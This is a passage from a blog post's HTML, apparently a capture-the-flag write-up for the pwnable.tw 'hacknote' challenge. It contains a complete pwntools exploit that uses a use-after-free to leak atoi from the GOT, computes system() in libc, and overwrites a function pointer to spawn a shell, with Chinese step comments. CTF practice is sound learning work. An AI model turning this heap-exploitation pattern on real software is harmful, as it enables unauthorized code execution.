class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./hacknote_4'</span></span><br><span class="line">p = process(filename)</span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./hacknote_4"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Your choice :")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请两个非0大小的块(而且要一样，不然不好使【不知道为什么，大佬教教我。。。】)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将两个块的头malloc，其中一个还是ptr[i]，另一个0x8大小的作为数据区</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862b</span>)+p32(elf.got[<span class="string">'atoi'</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为原先两个ptr[i]都申请回来了，所以可以将上面前四个字节作为函数，后四个字节作为参数地址。</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = (u32(p.recv()[:<span class="number">4</span>]))</span><br><span class="line">log.success(<span class="string">"atoi:"</span>+str(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = (atoi_addr) - (libc.symbols[<span class="string">'atoi'</span>])</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为没有edit函数，所以先delete再add做修改。</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(system_addr)+<span class="string">'||sh'</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#调用</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/01/09/蓝桥杯入门训练/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-01-09 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn/">pwn<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/pwnable-tw/">pwnable.tw<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2021 winter
+  
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind.386</a>.    
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
